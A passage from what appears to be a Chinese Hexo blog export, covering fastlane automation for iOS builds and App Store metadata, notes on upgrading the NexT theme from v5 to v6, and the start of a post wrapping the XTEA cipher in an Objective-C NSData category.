.env.KYAnimalLocationInternational .env文件的配置参考如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# APP唯一标识符APP_IDENTIFIER = "你项目的标识"# 苹果开发者账号APPLE_ID = "你的苹果开发者账号"# 苹果开发者帐号密码# FASTLANE_PASSWORD = "xxxxxx"# App Store Connect Team IDITC_TEAM_ID = "xxxxxx"# Developer Portal Team IDTEAM_ID = "xxxxxx"# 自动提交审核SUBMIT_FOR_REVIEW = false# 审核通过后立刻发布AUTOMATIC_RELEASE = false# WORKSPACE名称WORKSPACE_NAME = "xxx.xcworkspace"# SCHEME名称SCHEME_NAME = "当前的target名称 xxx"# 截图SCHEME名称SNAPSHOT_SCHEME_NAME = "xxxUITests"# 发布签名证书描述文件名称PROVISIONINGPROFILES_DISTRIBUTION_NAME = "发布证书描述文件名称"# 开发签名证书描述文件名称PROVISIONINGPROFILES_DEVELOPMENT_NAME = "开发证书描述文件名称"# 内测签名证书描述文件名称PROVISIONINGPROFILES_ADHOC_NAME = "adhoc证书描述文件名称"# APP元数据及截图存放路径METADATA_PATH = "./fastlane/KYAnimalLocation/metadata"SCREENSHOTS_PATH = "./fastlane/KYAnimalLocation/screenshots"# APP元数据及截图下载时，直接覆盖原有数据，不询问DELIVER_FORCE_OVERWRITE = true# 发布版本号# APP_VERSION_RELEASE = "2.1.0"# 新版本修改记录# RELEASE_NOTES = "1) 升级测试第一行\n2) 升级测试第二行"# 蒲公英 更新描述# PGY_UPDATE_DESCRIPTION = "fastlane自动打包上传测试" Appfile 此时的配置就比较简单了，直接根据变量名称获取对应的参数即可。 1234567891011# The bundle identifier of your appapp_identifier ENV['APP_IDENTIFIER']# Your Apple email addressapple_id ENV['APPLE_ID'] # App Store Connect Team IDitc_team_id ENV['ITC_TEAM_ID'] # Developer Portal Team IDteam_id ENV['TEAM_ID'] 配置 Deliverfile文件 在fastlane目录下创建一个Deliverfile文件 用于配置自动打包发布 App 到 iTunes Connect 时候的配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# The Deliverfile allows you to store various App Store Connect metadata# For more information, check out the docs# https://docs.fastlane.tools/actions/deliver/# The bundle identifier of your appapp_identifier ENV['APP_IDENTIFIER']# your Apple ID userusername ENV['APPLE_ID']# 元数据的路径metadata_path ENV['METADATA_PATH']screenshots_path ENV['SCREENSHOTS_PATH']# 下载 metadata 及 screenshots 时直接覆盖，不询问force true# 不覆盖 iTunes Connect原有截图skip_screenshots ENV['SKIP_SCREENSHOTS']# 自动提交审核submit_for_review ENV['SUBMIT_FOR_REVIEW']# 审核通过后立刻发布automatic_release ENV['AUTOMATIC_RELEASE']# App store 中待发布的 App 版本，若每个 target 的版本号不同，可以通过.env 文件来分别定义# app_version ENV['APP_RELEASE_VERSION']# 新版本修改记录# release_notes(&#123;# "en-US" =&gt; "1) upgrade test line 1\n2) upgreade test line 2",# "zh-Hans" =&gt; "1) 升级测试第一行\n2) 升级测试第二行"#&#125;)# App 加密算法使用情况及广告相关配置submission_information(&#123; # Export Compliance export_compliance_available_on_french_store: "false", export_compliance_contains_proprietary_cryptography: "false", export_compliance_contains_third_party_cryptography: "false", export_compliance_is_exempt: "false", export_compliance_uses_encryption: "false", export_compliance_app_type: nil, export_compliance_encryption_updated: "false", export_compliance_compliance_required: "false", export_compliance_platform: "ios", content_rights_contains_third_party_content: "false", # 是否包含，显示，访问第三方内容 content_rights_has_rights: "false", # Advertising Identifier 广告标识符 add_id_info_limits_tracking: "false", add_id_info_serves_ads: "false", add_id_info_tracks_action: "false", add_id_info_tracks_install: "false", add_id_info_uses_idfa: "false"&#125;); 此时，我们之前针对单项目写死的一些参数，就可以从.env 中加载了 123456789101112131415161718192021222324252627desc "Archive and export an Ad-Hoc ipa package" lane :adhoc do # 打adhoc包的动作名称 # build_app 和 gym 都是 build_ios_app的别名 build_app( workspace: "KYAnimalLocation.xcworkspace", scheme: ENV['SCHEME_NAME'], # 工程下要打包的项目,如果一个工程有多个项目则用[项目1,项目2] clean: true, # 在构建前先clean silent: true, # 终端不显示不需要的信息 默认是false include_bitcode: false, # 是否包含bitcode configuration: "Release", # 打包配置 export_method: "ad-hoc", # 指定打包所使用的输出方式，app-store, ad-hoc, package, enterprise, development, developer-id，即xcodebuild的method参数 output_directory: './Archive', # 打包后的 ipa 文件存放的目录 (项目根目录) 桌面："/Users/⁨sevencho⁩/Desktop/Archive" output_name: "#&#123;ENV['SCHEME_NAME']&#125;_adhoc_#&#123;archiveTime&#125;", # ipa 文件名 export_options: &#123; method: "ad-hoc", provisioningProfiles: &#123; ENV['APP_IDENTIFIER'] =&gt; ENV['PROVISIONINGPROFILES_ADHOC_NAME'], &#125; &#125; ) # pgyer(api_key: "api key", user_key: "user key", update_description: "正在将安装包上传到蒲公英") #上传到蒲公英 # firim(firim_api_token: [firim_api_token]) #上传到firim puts("-------------------------------------------------") puts("------------ 构建并导出Ad-Hoc ipa成功 -------------") puts("-------------------------------------------------") end 自动化构建 配置好相关的自动化动作工作流，我们就可以在终端输入指令执行了，例如根据我们配置的自动打测试包lane开始自动打包，只需要终端进入项目根目录，输入 fastlane adhoc 等待完成即可。 双重验证问题 如果我们的账号开启了双重验证，那么需要配置专属密码，否则每次打包都需要中断输入验证码，影响体验。 首先在苹果账号管理界面生成一个专属的用于自动化构建的密码APP-SPECIFIC PASSWORDS。网址在这里。 将生成的专属密码通过环境变量FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD提供给fastlan。 执行fastlane spaceauth -u user@email.com，生成session cookie。 通过环境变量FASTLANE_SESSION 提供session cookie给fastlan。 具体就是在~/.bash_profile 中配置如下两个环境变量（如果你使用的是Iterm2 怎在~/.zshrc中配置）： 123// 注意需要将上面生成的专属密码和session cookie替换下面的=右边的内容export FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD=专属密码 export FASTLANE_SESSION=session cookie 可以使用vim ~/.bash_profile访问bash_profile文件进行添加或者直接进入bash_profile文件目录打开后编辑，注意显示隐藏文件。 此方法有效期只有一个月，超过一个月就需要重新配置session cookie，所以一劳永逸的方法就是将打包上架用的开发者账号的双重验证关闭。 自动截取屏幕预览图 有时候，我们可能会在界面改版后就需要再次截取对应的截面图作为App Store的预览图，如果每次都手动操作就会很繁琐，此时就可以配合UI测试进行自动化截屏。 配置好自动截图lane后就可以按照指定的机型及特定界面启动不同模拟器进行截图，截图完成后会生成html预览网页。 具体的配置步骤如下： 创建项目对应的UI Test target，如果已经默认创建过就跳过。 终端进入项目根目录，执行fastlane snapshot init指令。 会在fastlane目录下生成Snapfile和SnapshotHelper.swift两个文件。 把SnapshotHelper.swift文件加入到项目的 UI Test target，注意导入时候选择的target。 如果你的项目是OC，则默认会创建桥接文件： 为UI Test target创建一个对应的Xcode scheme 选择新建的scheme点击编辑选项，进入编辑界面选择”Build“，然后在”Run“的选项下的方框内勾选；并勾选对应的Shared选项。 如果是OC项目，需要在UI测试类导入桥接文件，桥接文件格式： #import &quot;xxxUITests-Swift.h&quot; xxx是你的项目名称 在UI Test类的setUp方法中计入如下代码 如果是Swift项目 123let app = XCUIApplication()setupSnapshot(app)app.launch() 如果是OC项目 C123XCUIApplication *app = [[XCUIApplication alloc] init];[Snapshot setupSnapshot:app];[app launch]; 设置Build Settings -&gt; Defines Module设置为YES 进入UI测试类，点击左下角的录制按钮（红色圆形），可以将所有的交互动作录制来下自动生成对应的代码。例如哪些界面需要截图，我们就需要点进去对应的界面生成对应的测试代码。 如果你发现录制按钮是灰色不可点击状体，请将鼠标在testExample方法内部点击下即可。 上一步生成的测试代码中有跳转不同界面的逻辑，我们需要截图就只需跳转界面代码中间插入如下代码： Swift: snapshot(&quot;01LoginScreen&quot;) Objective C: [Snapshot snapshot:@&quot;01LoginScreen&quot; timeWaitingForIdle:10]; 截图演示代码如下，参考格式即可，注意录制时如有中文，默认现实的Unicode字符串，请自行查询。 1234567891011121314151617181920212223242526272829303132- (void)testExample&#123; [Snapshot snapshot:@"01LoginScreen" timeWaitingForIdle:10]; XCUIApplication *app = [[XCUIApplication alloc] init]; // 登录 XCUIElement *phoneNumberTextFields = app.textFields[@"\u8bf7\u8f93\u5165\u624b\u673a\u53f7"]; // 请输入手机号 [phoneNumberTextFields tap]; [phoneNumberTextFields typeText:@"xxxxxxxxxxxx"]; XCUIElement *passwordTextFields = app.secureTextFields[@"\u8bf7\u8f93\u5165\u5bc6\u7801"]; // 请输入密码 [passwordTextFields tap]; [passwordTextFields typeText:@"xxxxxxxxxxxx"]; [app.buttons[@"\u767b\u5f55"] tap]; // 登录 // 截取分类图片 XCUIElementQuery *tabBarsQuery = app.tabBars; [tabBarsQuery.buttons[@"\u5206\u7c7b"] tap]; // 分类 [Snapshot snapshot:@"02CategoryScreen" timeWaitingForIdle:10]; // 截取个人界面图片 [tabBarsQuery.buttons[@"\u6211\u7684"] tap]; // 我的 [Snapshot snapshot:@"03ProfileScreen" timeWaitingForIdle:10]; // 截取首页图片 [tabBarsQuery.buttons[@"\u9996\u9875"] tap]; // 首页 [Snapshot snapshot:@"04HomeScreen" timeWaitingForIdle:10]; // 截取商品详情图片[[app.collectionViews.otherElements.collectionViews.cells.otherElements childrenMatchingType:XCUIElementTypeImage].element tap]; // 进入商品详情 [Snapshot snapshot:@"05ItemDetailsScreen" timeWaitingForIdle:10]; [app.navigationBars[@"\u5546\u54c1\u8be6\u60c5"].buttons[@"btn navbar back"] tap]; // 退出商品详情&#125; 编辑Snapfile文件，以指定截取哪些机型及哪些页面的图片，具体配置请参考注释。 1234567891011121314151617181920212223242526272829303132333435363738# 指定截取哪些设备的图片devices(["iPhone 8","iPhone 8 Plus","iPhone SE","iPhone X","iPhone XS Max","iPad Pro (12.9-inch)","Apple TV 1080p"])# 指定截取的语言类型languages([ "en-US", "zh-Hans"])# The name of the scheme which contains the UI Tests# scheme("SchemeName")scheme("你的项目名称UITests")# 截图保存目录output_directory("./Screenshots")# 自动覆盖上次截图？clear_previous_screenshots(true)# Arguments to pass to the app on launch. See https://docs.fastlane.tools/actions/snapshot/#launch-arguments# launch_arguments(["-favColor red"])# 不要并发运行模拟器截图 默认 true# concurrent_simulators(false) # 某个设备截图出现错误就停止截图 默认 falsestop_after_first_error(true)output_simulator_logs(true)# 所有截图完成 打开预览网页 默认 false# skip_open_summary(true) 在终端执行fastlane snapshot指令，开始自动启动模拟器截图，等待完成即可。完成后终端会有提示且会打开预览网页（如果配置的默认开启）。 下载App Store Connect上元数据和屏幕截图 我们可以使用自动化脚本打发布用的安装包，然后手动上传到App Store Connect配置发布应用；也可以直接在本地配置应用在App Store Connect的发布需要的相关配置，然后一键上传发布即可。 要本地配置就需要将App Store Connect应用的已有配置信息拉取到本地： 拉取App相关的元数据及配置参数到本地（发布配置选项以文本文件方式分类） 1bundle exec fastlane deliver download_metadata -a yourBundleIdentifier -m ./fastlane/metadata/KYAnimalLocation -u yourAppleID 拉取App配置的启动图 1bundle exec fastlane deliver download_screenshots -a yourBundleIdentifier -m ./fastlane/screenshots/KYAnimalLocation -u yourAppleID 以后发布新上线版本，就可以在本地修改相关信息如新版本更新信心、替换预览图等等；然后一个指令上传并发布新版本审核。 总结参考 手把手教你利用Jenkins持续集成iOS项目 jenkins+xcode+蒲公英实现ipa自动化打包 iOS持续集成（一）——fastlane 使用 fastlane官方文档]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>JenKins</tag>
        <tag>fastlane</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客NexT主题从v5.x.x更新到v6.x.x的记录及总结]]></title>
    <url>%2Farchives%2F14534beb.html</url>
    <content type="text"><![CDATA[当这个村庄局限我的一生时，小小的地球正在局限着整个人类。 ——刘亮程《一个人的村庄》 简介 因为nexT主题从v5.1.x更新到v6.0.x后，主仓库已从 iissnan 名下迁移至 theme-next 组织。所以就导致每次在终端生成、部署博客的时候，会有主题迁移的信息。虽然没什么实质的影响，但是每次看到后总会有些影响心情。 1234567WARN ===============================================================WARN ========================= ATTENTION! ==========================WARN ===============================================================WARN NexT repository is moving here: https://github.com/theme-nextWARN ===============================================================WARN It's rebase to v6.0.0 and future maintenance will resume thereWARN =============================================================== 所以趁着今天的空余时间，就把博客主题直接更新到最新版本了。因为更新会牵扯到一些自定义的文件及样式配置，所以就需要格外小心谨慎，更新中遇到的问题及相关解决方案记录于此，留作遇到相同问题的小伙伴参考。 更新前：Hexo v3.7.1 vs NexT.Muse v5.1.4 更新后：Hexo v3.7.1 vs NexT.Muse v6.4.1（截止更新时是最新版本） 正文更新准备 &amp; 安装 更新前，请参考官方的升级指导从 NexT v5.1.x 更新，强烈建议按照官方推荐的升级方式，即使出错，也可以回退到之前可用的版本。 关于新主题的下载及目录，官方指导文档已经很清楚了，也很简单，这里就不在赘述。 站点配置文件 站点配置文件_config.yml位于博客站点的根目录下。 下载完新的主题后，建议将主题目录下的_config.yml文件备份一份，便于修改出错恢复。 分别打开原next目录和新版本next-reloaded目录下的_config.yml文件，进行对比更改。修改语言配置文件 新版本语言配置文件命名发生变化，所以需要修改站点配置文件： 搜索language:字段，将后面的zh-Hans 改为 zh-CN 。 12- language: zh-Hans+ language: zh-CN 修改加载主题 我们需要让站点加载新的主题，所以需要修改主题加载目录： 搜索theme:字段，将后面的next 修改为 next-reloaded 12- theme: next+ theme: next-reloaded 主题配置文件 主题配置文件_config.yml位于对应主题目录下。关键字 主题配置文件首先添加博客的关键字，如果你旧版本有的话就直接拷贝过来： 12# Set default keywords (Use a comma to separate)keywords: "iOS, C, Object-C, Swift, Python" 站点创建时间 站点创建时间，如果不指定，默认是当前时间，如2018，根据需要修改： 如需修改，只需要移除since:前面的#号即可。 1234 footer:# Specify the date when the site was setup.# If not defined, current year will be used.#since: 2015 站点菜单 菜单及图标配置，可以从旧版本直接拷贝替换： 12345678910menu: home: / || home categories: /categories/ || th archives: /archives/ || archive about: /about/ || user tags: /tags/ || tags #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat commonweal: /404.html || heartbeat #公益404 社交 社交分享一样，可以直接拷贝原有的： 123social: GitHub: https://github.com/SevenCho || github E-Mail: mailto:243166621@qq.com || envelope 分页 关于文章分页，我是选择将自动分页关闭，采用手动分页的方式，手动分页的话可以更好的控制显示的摘要，v6.x 默认已经关闭，如果你想打开的话，如下： 手动分页只需要在需要分页的地方添加&lt;!-- more --&gt;即可。 1234auto_excerpt:- enable: false+ enable: true length: 150 文章 &amp; 打赏 &amp; 个人头像 如果想修改文章创建、更新时间，搜索post_meta:字段，进行修改即可。 修改打赏二维码，没什么说的，搜索# Reward，拷贝旧版本替换即可。 个人中心的头像信息设置，搜索avatar: 已经不需要自己自定义实现头像圆形样式文件和鼠标悬浮的旋转效果，默认已经集成，启用即可。 1234567891011avatar: # 在博客的根目录 (source/images)的话: /images/avatar.gif # 在站点目录 (source/uploads)的话: /uploads/avatar.gif # 也可以直接使用图片链接 url: /uploads/images/avatar.JPG # 设置是否裁剪成圆形 rounded: true # 设置不透明度 0 ~ 1 opacity: 1 # 设置鼠标放上去的旋转效果 rotated: true 代码块 内置了代码块的一些配置，如边框，拷贝按钮等等，不需要我们自己再在样式文件中自定义了， 搜索codeblock:： 12345678codeblock: # 代码块边框圆角半径，不设置默认是1 border_radius: # 添加一个`拷贝`按钮，可以拷贝代码块内容，不需要我们自己去自定义了 copy_button: enable: false # 是否显示结果 show_result: false 版权 设置站点版权信息，可以搜索post_copyright:字段，根据自己需要修改，如我的： 1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/ 用户小图标 修改站点底部用户小图标，现在已经内置该功能，还可以设置动画，搜索icon:启动即可： 图标以fontawesomem命名，更多图标在这里 如果使用heart图标建议使用红色(#ff0000)。 如下是我显示的心形图标及颜色和启用动画。 1234icon: name: heart # user animated: true color: &quot;#ff0000&quot; 配置站点文字 自带的主题默认会根据设备查询是否安装了对应的常用字体：如苹果的苹方字体，微软的雅黑字体。 我们可以自定义网站地址，参考官方文档，我们可以直接在主题配置文件中，搜索font:即可以修改全局字体，标题字体、文章字体、logo字体、代码块字体等等。 如果我们设置的字体在用户设备上没有安装，会回退到主题的默认字体设置上。 这里每种类别只可以设置一种自定义的字体。 如果还需要精细控制每一处的字体，可以通过浏览器的调试功能，抓取到对应的标签在自定义样式文件中设置。 配置插件 升级后大部分插件也有变动，如果你有用到下面的插件的话，可以参考。 文章统计 旧版本是使用post_wordcount统计文章的字数，阅读时长等等，新版本该插件废弃，并且内置了symbols_count_time作为替换。 参考这里进行安装及配置。 本地搜索 本地搜索内置进主题，依赖启用hexo-generator-searchdb插件。 参考这里进行安装及配置。 图片预览 图片预览已经内置了新的预览配置， 只需要安装启动依赖插件theme-next-fancybox3即可。 参考这里进行安装及配置。 顶部加载进度条 站点的顶部加载进度条也已经内置，只需要安装启动依赖插件theme-next-pace即可。 参考这里进行安装及配置。 配置文件网站logo图标 配置网站的logo图标，请在/Blog/themes/next-reloaded/source/images目录中替换如下图标： favicon-32x32-next.png favicon-16x16-next.png logo.svg 文字关联标签图标 文章的默认标签图标是一个#号，不是很喜欢，我们可以修改为自己喜欢的图标，如拟物的标签图标： 打开 /Blog/themes/next-reloaded/layout/_macro/目录下的post.swig 文件。 搜索 rel=&quot;tag&quot;&gt;# , 将 # 换成 &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;。 自定义配置 旧版本的一些自定义的配置文件，可以直接拷贝到新的主题对应位置下： /Blog/themes/next-reloaded/source/css/_custom/目录下的custom.styl文件。 /Blog/themes/next-reloaded/source/css/_variables/目录下的custom.styl文件。 /Blog/themes/next-reloaded/layout/_custom/目录下的custom.swig文件。 引用样式修改 如果需要修改blockquote引用样式： 可以在/Blog/themes/next-reloaded/source/css/_common/scaffolding/目录下的base.styl文件直接修改。 推荐在/Blog/themes/next-reloaded/source/css/_custom/目录下的custom.styl文件中自定义样式即可。 分割线样式 修改文章分割线样式，参考/Blog/themes/next-reloaded/source/css/_common/components/post/目录下的post-eof.styl文件。 网站版权 站点的版权配置文件，直接拷贝旧主题对应目录文件到对应目录即可： /Blog/themes/next-reloaded/layout/_macro/目录下的my-copyright.swig文件。 文章版权 直接拷贝旧主题对应目录文件到新的主题目录即可： /Blog/themes/next-reloaded/source/css/_common/components/post/目录下my-post-copyright.styl文件。 高亮样式 配置主题的一些高亮显示样式，可以配合自定义的样式文件一起使用： /Blog/themes/next-reloaded/source/css/_common/components/highlight/目录下的highlight.styl文件。 头像边框及旋转 （旧版本） 旧版本的头像样式及鼠标悬浮旋转在这里添加（新版本已经内置，可以不用管） /Blog/themes/next-reloaded/source/css/_common/components/sidebar/目录下的sidebar-author.styl文件。 1234567891011121314151617181920212223242526272829303132333435363738.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; // 修改头像边框 border-radius: 50%; -webkit-border-radius: 50%; -moz-border-radius: 50%; // 设置旋转 transition: 1.5s all;&#125;// 可旋转的圆形头像,`hover`动作.site-author-image:hover &#123;-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);-transform: rotate(360deg);&#125;.site-author-name &#123; margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight;&#125;.site-description &#123; margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color;&#125; 代码块拷贝按钮 （旧版本） 旧版本代码块复制按钮在这里添加（新版本已经内置，只需启用即可，可以不用管） /Blog/themes/next/source/js/src/目录下新建custom.js文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//此函数用于创建复制按钮function createCopyBtns() &#123; var $codeArea = $("figure table"); //查看页面是否具有代码区域，没有代码块则不创建 复制按钮 if ($codeArea.length &gt; 0) &#123; //复制成功后将要干的事情 function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function() &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function() &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125;; &#125;; //创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功响应按钮 //值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码) $(".post-body").before('&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;display: none;line-height: 1; font-size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); //创建 复制 插件，绑定单机时间到 指定元素，支持JQuery var clipboard = new Clipboard('#copyBtn', &#123; target: function() &#123; //返回需要复制的元素内容 return document.querySelector("[copyFlag]"); &#125;, isSupported: function() &#123; //支持复制内容 return document.querySelector("[copyFlag]"); &#125; &#125;); //复制成功事件绑定 clipboard.on('success', function(e) &#123; //清除内容被选择状态 e.clearSelection(); changeToSuccess(e); &#125;); //复制失败绑定事件 clipboard.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); //鼠标 在复制按钮上滑动和离开后渐变显示/隐藏效果 $("#copyBtn").hover( function() &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function() &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;//感应鼠标是否在代码区$("figure").hover( function() &#123; //-------鼠标活动在代码块内 //移除之前含有复制标志代码块的 copyFlag $("[copyFlag]").removeAttr("copyFlag"); //在新的（当前鼠标所在代码区）代码块插入标志：copyFlag $(this).find(".code").attr("copyFlag", 1); //获取复制按钮 $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //获取到按钮的前提下进行一下操作 //停止按钮动画效果 //设置为 显示状态 //修改 复制按钮 位置到 当前代码块开始部位 //设置代码块 左侧位置 $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function() &#123; //-------鼠标离开代码块 //设置复制按钮可见度 2秒内到 0 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); &#125;);//页面载入完成后，创建复制按钮$(document).ready(function() &#123; createCopyBtns();&#125;); 总结 总体来说，整个更新升级的过程还是没有太多的坑的，我在第一次修改的时候，一口气把整个主题配置文件都修改完了，最后发现运行不起来，然后就是恢复后重新一处一处修改。如果不是很清楚功能，建议每修改一处就运行一次，稳步推进。 如果是主题文件修改后无法运行，建议先在这里校验下文件有无语法错误，尤其是我们不太注意的空格有时就是罪魁祸首。 我遇到直接清空本地的生成文件然后重新生成，在本地预览是完好的，但是部署到外网就网站格式全部没有了。最后我将原next主题目录更改名称为next-v5（名字随便，便于区分即可），然后将新版本next-reloaded主题目录名字修改为next，在博客根目录修改加载主题为next，然后没有问题了。如果有遇到同样问题的小伙伴可以这样尝试下。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次iOS使用XTEA微型加密算法]]></title>
    <url>%2Farchives%2Fd3400f8e.html</url>
    <content type="text"><![CDATA[许多年后有一股寒风，从我自以为火热温暖的从未被寒冷侵入的内心深处阵阵袭来时，我才发现穿再厚的棉衣也没用了。生命本身有一个冬天，它已经来临。 ——刘亮程《寒风吹彻》 简介 在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫·惠勒与罗杰·尼达姆。这项技术最初于1994年提交给鲁汶的快速软件加密的研讨会上，并在该研讨会上演讲中首次发表。 在给出的代码中：加密使用的数据为2个32位无符号整数，密钥为4个32位无符号整数即密钥长度为128位 正文关于加密算法 加密算法虽然我们可能不是非常了解底层原理，但是在现在信息安全的年代，工作中也会经常需要用的，比如： 非对称加密的：RSA、ECC（移动设备用）、DSA（数字签名用） 对称加密的：AES，DES Hash算法的：MD2、MD4、MD5、HAVAL、SHA、SHA-1、HMAC、HMAC-MD5、HMAC-SHA1 有时候我们可能会遇到这种情况：因为数据长度有限制，需要加密后的数据长度尽可能的短。比如如果给蓝牙的广播数据加一次密做单向的校验。但是在iOS开发中，自定义广播的数据长度是有限的，总共可用的才31个字节，再除去蓝牙字段名称、长度、蓝牙名称的实际值、自定义字段名称及长度等等，实际上可以给我们自定义使用的部分那真的是少的可怜。 但是又不能将全部的广播包数据都加密，因为苹果会先将广播数据按照协议解析完成之后，将里面的少部分数据封装成对象抛给上层供我们使用，如果整个广播包加密会导致我们无法获取到广播数据，所以就只能单独的加密自定义广播部分的数据。 在这里就不能使用RSA了，因为性能比较低、加解密比较慢；AES这样的算法又对数据长度有要求，最低都需要16个字节；Hash算法又不可逆，无法获取原始数据。最终在技术经理的提议下，使用了一种叫XTEA的算法，XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等。 XTEA加密过程 iOS使用 算法实现源码是使用C语言写的，虽然iOS可以直接调用C函数，但是直接调用总感觉很别扭，所以就将该算法直接以分类的方式简单封装一下，需要用到的小伙伴可以直接使用，因为一共就没多少行代码，直接贴代码了： 直接给NSData添加一个XTEA算法的分类，.h文件如下： 12345678910111213141516171819/** 加密数据 @param data 需要加密的数据 (8字节) @param keyData 加密的Key (16字节) @param rounds 循环次数 @return 加密过的数据 (8字节) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds;/** 解密数据 @param data 需要解密的数据 (8字节) @param keyData 解密的key (16字节) @param rounds 循环次数 @return 解密过的数据 (8字节) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds; .m文件如下： 注意引入需要的头文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// 引入必要的头文件#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;// 声明常量static NSInteger const kUint32DataCount = 2;static NSInteger const kUint32KeyCount = 4;static NSInteger const kSubdataLength = 4;void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;/** 加密数据 @param data 需要加密的数据 (8字节) @param keyData 加密的Key (16字节) @param rounds 循环次数 @return 加密过的数据 (8字节) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @"encryptData: (data length != 8)"); NSAssert(keyData.length == 16, @"encryptData: (keyData length != 16)"); // 将数据拆分成2个uint32_t数组 uint32_t encryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; encryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 将Key拆成4个uint32_t数组 uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 加密 encipher(rounds, encryptData, key); // 返回结果 return [NSData dataFromUInt32Array:encryptData length:data.length];&#125;/** 解密数据 @param data 需要解密的数据 (8字节) @param keyData 解密的key (16字节) @param rounds 循环次数 @return 解密过的数据 (8字节) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @"decryptData: (data length != 8)"); NSAssert(keyData.length == 16, @"decryptData: (keyData length != 16)"); // 将数据拆分成2个uint32_t数组 uint32_t decryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; decryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 将Key拆成4个uint32_t数组 uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 解密 decipher(rounds, decryptData, key); // 返回结果 return [NSData 